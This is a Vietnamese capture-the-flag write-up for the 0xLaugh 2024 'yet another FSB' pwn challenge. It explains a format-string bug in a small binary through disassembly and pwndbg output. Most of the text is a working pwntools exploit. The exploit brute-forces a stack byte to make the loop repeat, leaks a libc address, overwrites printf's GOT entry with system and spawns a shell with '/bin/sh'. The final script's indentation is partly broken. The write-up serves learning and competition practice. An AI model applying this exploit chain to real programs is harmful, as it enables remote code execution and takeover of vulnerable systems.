# 0XLAUGH CTF 2024 - yet another FSB

Bài giải này được lấy ý tưởng từ anh `Lio`, một tiền bối trong BKISC chung team với mình hehe.

```
File:     /home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
Stripped:   No
```

Ta có thể thấy rằng đây là bài Partial RELRO, và NX được bật, ngoài ra không có gì nổi bật khác. Cùng chạy thử file binary xem nó làm gì nào

```
└─$ ./yet_another_fsb
ABC
ABC
```

```
└─$ ./yet_another_fsb
%p %p %p %p %p %p %p %p
0x7ffcd2d516a0 0xff 0x7f522b22f981 (nil) 0x7f522b319f40 0x7025207025207025 0x2520702520702520 0x2070252070252070
�2+R

```

Có vẻ bài toán nhận đầu vào, sau đó khi ta nhập vào thì nó in ra lại chuỗi ta đã nhập -> Format String Bug. Cùng nhau dissamble file binary để xem đoạn code nào

```
undefined8 main(void)

{
  char input [270];
  short i;

  i = 0;
  setup();
  do {
    read(0,input,255);
    printf(input);
  } while (i != 0);
  return 0;
}
```

À há, đúng như dự đoán, bài toán này có lỗ hổng Format String, kết hợp với Checksec chỉ bật `Partial Relro`, ý tưởng là như sau: Thay thế GOT của hàm `printf` thành `system` và tiến hành gọi `/bin/sh`. Hàm `printf` nhận đầu vào `input` và đưa vào thanh ghi `rdi`, từ đó ta có thể nhập chuỗi `/bin/sh` vào và chuỗi đó sẽ được đưa vào thanh ghi `rdi`. Lần sau khi gọi `printf` thì nó sẽ gọi `system('/bin/sh')`. Nhưng, có 1 vấn đề rất lớn mà chúng ta phải đối mặt, biến i được khai báo với giá trị là 0, nhưng vòng while chỉ thực hiện khi `(i != 0)`, nói cách khác. Vòng lặp này chỉ thực hiện 1 lần, cho nên việc mà ta có thể vừa `leak` địa chỉ, vừa `overwrite` GOT của hàm `printf` là không thể. Đó là lúc chúng ta cần phải nghĩ theo 1 hướng: đó là thay đổi giá trị biến `i` sao cho nó khác 0, từ đó tạo ra vòng lặp vô hạn -> từ đây thì có rất nhiều cách để khai thác rồi. Cùng debug để xem nào.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004011a7 <+0>:     push   rbp
   0x00000000004011a8 <+1>:     mov    rbp,rsp
   0x00000000004011ab <+4>:     sub    rsp,0x110
   0x00000000004011b2 <+11>:    mov    WORD PTR [rbp-0x2],0x0
   0x00000000004011b8 <+17>:    mov    eax,0x0
   0x00000000004011bd <+22>:    call   0x401146 <setup>
   0x00000000004011c2 <+27>:    lea    rax,[rbp-0x110]
   0x00000000004011c9 <+34>:    mov    edx,0xff
   0x00000000004011ce <+39>:    mov    rsi,rax
   0x00000000004011d1 <+42>:    mov    edi,0x0
   0x00000000004011d6 <+47>:    call   0x401040 <read@plt>
   0x00000000004011db <+52>:    lea    rax,[rbp-0x110]
   0x00000000004011e2 <+59>:    mov    rdi,rax
   0x00000000004011e5 <+62>:    mov    eax,0x0
   0x00000000004011ea <+67>:    call   0x401030 <printf@plt>
   0x00000000004011ef <+72>:    cmp    WORD PTR [rbp-0x2],0x0
   0x00000000004011f4 <+77>:    je     0x4011f8 <main+81>
   0x00000000004011f6 <+79>:    jmp    0x4011c2 <main+27>
   0x00000000004011f8 <+81>:    mov    eax,0x0
   0x00000000004011fd <+86>:    leave
   0x00000000004011fe <+87>:    ret
End of assembler dump.
```

Dòng `mov    WORD PTR [rbp-0x2],0x0` gán giá trị của `rbp -  0x2` thành `0x0`. Khả năng cao đây là biến i, cùng đặt breakpoint ở đây và xem nào.

```
pwndbg> b* main+11
Breakpoint 1 at 0x4011b2
pwndbg> r
Starting program: /home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x00000000004011b2 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 RAX  0x4011a7 (main) ◂— push rbp
 RBX  0x7fffffffdd28 —▸ 0x7fffffffe0b8 ◂— '/home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb'
 RCX  0x403df0 —▸ 0x401110 ◂— endbr64
 RDX  0x7fffffffdd38 —▸ 0x7fffffffe0f6 ◂— 'COLORFGBG=15;0'
 RDI  1
 RSI  0x7fffffffdd28 —▸ 0x7fffffffe0b8 ◂— '/home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb'
 R8   0
 R9   0x7ffff7fcdf40 ◂— endbr64
 R10  0x7fffffffd930 ◂— 0x800000
 R11  0x246
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0x403df0 —▸ 0x401110 ◂— endbr64
 RBP  0x7fffffffdc00 —▸ 0x7fffffffdca0 —▸ 0x7fffffffdd00 ◂— 0
 RSP  0x7fffffffdaf0 ◂— 0x40 /* '@' */
 RIP  0x4011b2 (main+11) ◂— mov word ptr [rbp - 2], 0
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4011b2 <main+11>    mov    word ptr [rbp - 2], 0     [0x7fffffffdbfe] <= 0
   0x4011b8 <main+17>    mov    eax, 0                    EAX => 0
   0x4011bd <main+22>    call   setup                       <setup>

   0x4011c2 <main+27>    lea    rax, [rbp - 0x110]
   0x4011c9 <main+34>    mov    edx, 0xff                 EDX => 0xff
   0x4011ce <main+39>    mov    rsi, rax
   0x4011d1 <main+42>    mov    edi, 0                    EDI => 0
   0x4011d6 <main+47>    call   read@plt                    <read@plt>

   0x4011db <main+52>    lea    rax, [rbp - 0x110]
   0x4011e2 <main+59>    mov    rdi, rax
   0x4011e5 <main+62>    mov    eax, 0                    EAX => 0
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdaf0 ◂— 0x40 /* '@' */
01:0008│-108 0x7fffffffdaf8 —▸ 0x7fffffffdbd0 ◂— 0
02:0010│-100 0x7fffffffdb00 —▸ 0x7fffffffdc10 —▸ 0x7fffffffdc50 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— ...
03:0018│-0f8 0x7fffffffdb08 —▸ 0x7ffff7fe068d ◂— add rsp, 0xd8
04:0020│-0f0 0x7fffffffdb10 ◂— 0
05:0028│-0e8 0x7fffffffdb18 ◂— 0x1c
06:0030│-0e0 0x7fffffffdb20 ◂— 4
07:0038│-0d8 0x7fffffffdb28 ◂— 0x40 /* '@' */
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4011b2 main+11
   1   0x7ffff7dfac88 None
   2   0x7ffff7dfad4c __libc_start_main+140
   3         0x401085 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/xg $rbp-0x2
0x7fffffffdbfe: 0x7fffffffdca00000
```

Vậy địa chỉ của `rbp-0x2` (hay là biến `i`) thì đang có địa chỉ là `0x7fffffffdbfe`, nhưng khi ta chạy lần khác thì địa chỉ lúc này lại khác. Nguyên nhân là do ASLR được bật trên stack:

```
pwndbg> x/xg $rbp-0x2
0x7fffffffd96e: 0x7fffffffda100000
```

Vậy ta có thể tìm 1 địa chỉ nào trên stack gần giống với địa chỉ biến `i` này, cùng thử từng index nào.

```
%p %p %p %p %p %p %p %p
0x7fffffffd860 0xff 0x7ffff7edd981 (nil) 0x7ffff7fcdf40 0x7025207025207025 0x2520702520702520 0xa70252070252070
```

Ở index 6, 7, 8 sẽ nhận input đầu vào người dùng, hãy thử index 7 nào.

```
%7$p
0x7fffffffd940
```

Điều đặc biệt là ở địa chỉ thứ 7 này chỉ khác với địa chi `rbp-0x2` 1 byte cuối, nên ta có thể OVERWRITE byte cuối này sao cho nó giống với byte của `$rbp-0x2`. Nhưng, vì mỗi lần chạy có địa chỉ ở `$rbp-0x2` là khác nhau, nên ta không thể đoán được byte cuối, cách giải quyết là sử dụng Brute force để ghi đè mọi byte có thể xảy ra. Điểm chung của các địa chỉ của `rbp-0x2` dù mỗi lần đều thay đổi là có kí tự cuối là kí tự `e`. Nên chỉ cần BRUTE kí tự phía trước `e` này là kí tự không đoán được. Ta sẽ cần chạy vòng lặp để ghi đè số kí tự khả thi là: từ kí tự 0 - f (16 kí tự, nên xác suất là 1/16).

```
from pwn import *

e = ELF('./yet_another_fsb_patched')
libc = ELF('./libc.so.6')


# Stage 1: overwrite last byte for while index
while True:
    try:
        p = process('./yet_another_fsb_patched')
        # p = remote(HOST, 443, ssl=True, sni=HOST)
        payload = b'%c%7$hhn\xae'
        # gdb.attach(p, api=True)
        p.send(payload)
    except EOFError:
        p.close()
```

Bằng cách này, ta sẽ ghi đè được địa chỉ ở biến đó, và ghi đè giá trị của biến `i` đó thành giá trị khác 0. Sau khi đã có được vòng lặp vô hạn, ta cần phải biết được địa chỉ `libc`, và để có thể làm được việc đó thì ta cũng cần leak sử dụng Format string.

```
pwndbg> tel
00:0000│ rsp 0x7fffffffd858 —▸ 0x4011db (main+52) ◂— lea rax, [rbp - 0x110]
01:0008│ rsi 0x7fffffffd860 ◂— 0x40 /* '@' */
02:0010│-108 0x7fffffffd868 —▸ 0x7fffffffd940 ◂— 0
03:0018│-100 0x7fffffffd870 —▸ 0x7fffffffd980 —▸ 0x7fffffffd9c0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— ...
04:0020│-0f8 0x7fffffffd878 —▸ 0x7ffff7fe068d ◂— add rsp, 0xd8
05:0028│-0f0 0x7fffffffd880 ◂— 0
06:0030│-0e8 0x7fffffffd888 ◂— 0x1c
07:0038│-0e0 0x7fffffffd890 ◂— 4
pwndbg>
08:0040│-0d8 0x7fffffffd898 ◂— 0x40 /* '@' */
09:0048│-0d0 0x7fffffffd8a0 ◂— 0x600000
0a:0050│-0c8 0x7fffffffd8a8 ◂— 0xffffffffffffffff
0b:0058│-0c0 0x7fffffffd8b0 ◂— 0x40000
0c:0060│-0b8 0x7fffffffd8b8 ◂— 0xc /* '\x0c' */
0d:0068│-0b0 0x7fffffffd8c0 ◂— 0x40 /* '@' */
0e:0070│-0a8 0x7fffffffd8c8 ◂— 8
0f:0078│-0a0 0x7fffffffd8d0 ◂— 0x8000
pwndbg>
10:0080│-098 0x7fffffffd8d8 ◂— 0x800
11:0088│-090 0x7fffffffd8e0 ◂— 0x800
12:0090│-088 0x7fffffffd8e8 ◂— 0x240000
13:0098│-080 0x7fffffffd8f0 ◂— 0x600000
14:00a0│-078 0x7fffffffd8f8 ◂— 0x600000
15:00a8│-070 0x7fffffffd900 ◂— 0x80
16:00b0│-068 0x7fffffffd908 —▸ 0x7fffffffd938 ◂— 0
17:00b8│-060 0x7fffffffd910 ◂— 0xa500000006
pwndbg>
18:00c0│-058 0x7fffffffd918 ◂— 0
... ↓     7 skipped
pwndbg>
20:0100│-018 0x7fffffffd958 —▸ 0x7ffff7fe6cc0 ◂— endbr64
21:0108│-010 0x7fffffffd960 ◂— 0
22:0110│-008 0x7fffffffd968 —▸ 0x7fffffffda98 —▸ 0x7fffffffde86 ◂— '/home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb'
23:0118│ rbp 0x7fffffffd970 —▸ 0x7fffffffda10 —▸ 0x7fffffffda70 ◂— 0
24:0120│+008 0x7fffffffd978 —▸ 0x7ffff7dfac88 ◂— mov edi, eax
25:0128│+010 0x7fffffffd980 —▸ 0x7fffffffd9c0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
26:0130│+018 0x7fffffffd988 —▸ 0x7fffffffda98 —▸ 0x7fffffffde86 ◂— '/home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb'
27:0138│+020 0x7fffffffd990 ◂— 0x1003fe040
pwndbg>
28:0140│+028 0x7fffffffd998 —▸ 0x4011a7 (main) ◂— push rbp
29:0148│+030 0x7fffffffd9a0 —▸ 0x7fffffffda98 —▸ 0x7fffffffde86 ◂— '/home/kali/CTF/0xlaugh/yet_another_fsb/public/yet_another_fsb'
2a:0150│+038 0x7fffffffd9a8 ◂— 0xae3f28b3ecc984fb
2b:0158│+040 0x7fffffffd9b0 ◂— 1
2c:0160│+048 0x7fffffffd9b8 ◂— 0
2d:0168│+050 0x7fffffffd9c0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
2e:0170│+058 0x7fffffffd9c8 —▸ 0x403df0 —▸ 0x401110 ◂— endbr64
2f:0178│+060 0x7fffffffd9d0 ◂— 0xae3f28b3ebe984fb
pwndbg>
30:0180│+068 0x7fffffffd9d8 ◂— 0xae3f38f3009784fb
31:0188│+070 0x7fffffffd9e0 ◂— 0x7fff00000000
32:0190│+078 0x7fffffffd9e8 ◂— 0
33:0198│+080 0x7fffffffd9f0 ◂— 0
34:01a0│+088 0x7fffffffd9f8 ◂— 1
35:01a8│+090 0x7fffffffda00 —▸ 0x7fffffffda90 ◂— 1
36:01b0│+098 0x7fffffffda08 ◂— 0x1b2fe3a0ebfe2f00
37:01b8│+0a0 0x7fffffffda10 —▸ 0x7fffffffda70 ◂— 0
pwndbg>
38:01c0│+0a8 0x7fffffffda18 —▸ 0x7ffff7dfad4c (__libc_start_main+140) ◂— mov r14, qword ptr [rip + 0x1bc235]
39:01c8│+0b0 0x7fffffffda20 —▸ 0x7fffffffdaa8 —▸ 0x7fffffffdec4 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
3a:01d0│+0b8 0x7fffffffda28 —▸ 0x403df0 —▸ 0x401110 ◂— endbr64
3b:01d8│+0c0 0x7fffffffda30 —▸ 0x7fffffffdaa8 —▸ 0x7fffffffdec4 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
3c:01e0│+0c8 0x7fffffffda38 —▸ 0x4011a7 (main) ◂— push rbp
3d:01e8│+0d0 0x7fffffffda40 ◂— 0
3e:01f0│+0d8 0x7fffffffda48 ◂— 0
3f:01f8│+0e0 0x7fffffffda50 —▸ 0x401060 (_start) ◂— endbr64

```

Có thể leak được địa chỉ `__libc_start_main` ở địa chỉ `0x7fffffffda18`. Để biết được nó ở offset nào thì ban đầu ta cần xác định được chỗ ta nhập input là ở địa chỉ nào của stack đã. Sau đó áp dụng công thức: `(địa chỉ cần biết offset - địa chỉ input) / 8 + 6`

```
0:0000│ rsi rsp 0x7fffffffd860 ◂— 0xa636261 /_ 'abc\n' _/
01:0008│-108 0x7fffffffd868 —▸ 0x7fffffffd940 ◂— 0
02:0010│-100 0x7fffffffd870 —▸ 0x7fffffffd980 —▸ 0x7fffffffd9c0 —▸ 0x7ffff7ffd000 (\_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— ...
03:0018│-0f8 0x7fffffffd878 —▸ 0x7ffff7fe068d ◂— add rsp, 0xd8
04:0020│-0f0 0x7fffffffd880 ◂— 0
05:0028│-0e8 0x7fffffffd888 ◂— 0x1c
06:0030│-0e0 0x7fffffffd890 ◂— 4
07:0038│-0d8 0x7fffffffd898 ◂— 0x40 /_ '@' _/
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
► 0 0x4011db main+52
1 0x7ffff7dfac88 None
2 0x7ffff7dfad4c __libc_start_main+140
3 0x401085 _start+37
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p/d 0x7fffffffda18 - 0x7fffffffd860
$1 = 440
pwndbg> p/d (0x7fffffffda18 - 0x7fffffffd860) /8 + 6
$2 = 61
```

Vậy offset ta cần leak là 61, sau đó ta lấy địa chỉ được leak trừ cho offset của libc_start_main, muốn biết được offset của libc_start_main thì ta sử dụng `vmmap` để kiểm tra địa chỉ libc base, lấy địa chỉ vừa leak được - cho libc base ra được offset. Sau thì ta lại lấy địa chỉ vừa leak được - cho offset vừa tìm thấy là sẽ có được libc base. Sau đó là việc ghi đè GOT cũng sử dụng format string thôi.

```
libc.address = int(p.recvline()[:-1], 16) -  0x25d4c
info(f'Libc base: %#x', libc.address)
print_address = e.got['printf']
system = libc.address + 0x50f10
info("Printf address: %#x", print_address)
info("SYstem address: %#x", system)
```

Ta cần tìm địa chỉ system để sau gọi `system('/bin/sh')`. Muốn có được offset của system thì có thể lấy địa chỉ system trên stack hiện tại - cho libc hiện.

```
pwndbg> p &system
$3 = (<text variable, no debug info> *) 0x7ffff7e25f10 <system>
pwndbg> p/x 0x7ffff7e25f10 - 0x7ffff7dd5000
$4 = 0x50f10
```

Và ta cũng cần thêm GOT của `printf`, để ghi đè địa chỉ `printf` thành `system`.

```

pwndbg> p &printf
[0x404000] printf@GLIBC_2.2.5 -> 0x7ffff7e2cc40 (printf) ◂— endbr64
$3 = (<text variable, no debug info> *) 0x7ffff7e25f10 <system>
```

Ta thấy 2 byte cuối của printf khác 2 byte cuối của system. Nhưng để cho chắc chắn, hãy thay 3 byte cuối. Vì vậy, cần phải tách ra 2 lần ghi đè, lần 1 ghi đè vào
`printf`, lần 2 là vào địa chỉ `printf + 1`. Để xử lý dễ dàng hơn nữa, lần thứ 1 ta nên ghi đè 1 byte cuối, trong khi lần 2 ta sẽ ghi 2 byte. Và cách ghi đè byte này sẽ sử dụng lần lượt là `%hhn%` (ghi 1 byte) và `%hn` (ghi 2 byte). Cuối cùng là offset để ta ghi payload vào, để
kiểm tra xem đầu vào của ta ở offset nào trên stack, ta cũng tiếp tục tận dụng Format string bug:

```
AAAAAAA%p %p %p %p %p %p %p %p %p
AAAAAAA0x7fffffffd860 0xff 0x7ffff7edd981 (nil) 0x7ffff7fcdf40 0x2541414141414141 0x2070252070252070 0x7025207025207025 0x2520702520702520
```

Đếm thì nó ở vị trí số 6, để cho chắc ăn thì ta dời nó đi 4 offset nữa (mỗi offset gồm 8 bytes, nên ta sẽ dời đi 0x20 - 32 bytes). Lý do cho việc này là để chắc chắn rằng việc
căn chỉnh stack là hợp lý, chúng ta đặt đúng địa chỉ `printf` lên stack. Nên ta sẽ có địa chỉ `printf` ở vị trí 10, và `printf + 1` ở vị trí 11. Xong hết rồi, tiến hành viết script thôiii..

# EXPLOITATION

```
from pwn import *

e = ELF('./yet_another_fsb_patched')
libc = ELF('./libc.so.6')

# Stage 1: overwrite last byte for while index

while True:
try:
p = process('./yet_another_fsb_patched') # p = remote(HOST, 443, ssl=True, sni=HOST)
payload = b'%c%7$hhn\xae'
        # gdb.attach(p, api=True)
        p.send(payload)
        p.recv(7)
        p.sendline(b'%61$p')
break
except EOFError:
p.close()

libc.address = int(p.recvline()[:-1], 16) - 0x25d4c
info(f'Libc base: %#x', libc.address)
print_address = e.got['printf']
system = libc.address + 0x50f10
info("Printf address: %#x", print_address)
info("SYstem address: %#x", system)

# Stage 2: overwrite GOT of printF to system

part1 = libc.sym['system'] & 0xff
part2 = (libc.sym['system'] >> 8) & 0xffff
info("Part 1: %#x", part1)
info("pART 2: %#x", part2)
payload = f'%{part1}c%10$hhn'.encode()
payload += f'%{part2 - part1}c%11$hn'.encode()
gdb.attach((p))
payload = payload.ljust(0x20, b'A')
payload += p64(e.got['printf'])
payload += p64(e.got['printf'] + 1)

p.sendline(payload)

p.sendline(b'/bin/sh\0')

p.interactive()

```

Sau đó là ta sẽ lấy được flag, khi chạy bị lỗi thì cứ tiến hành chạy lại đến khi nào được thôi (tỉ lệ là 1/16 >.<)

```
cat: flag: No such file or directory
sh: 2: hn%16703c%11: not found
$ cat flag.txt
u GOt the flagsh: 2: 6703c%11: not found
$
```
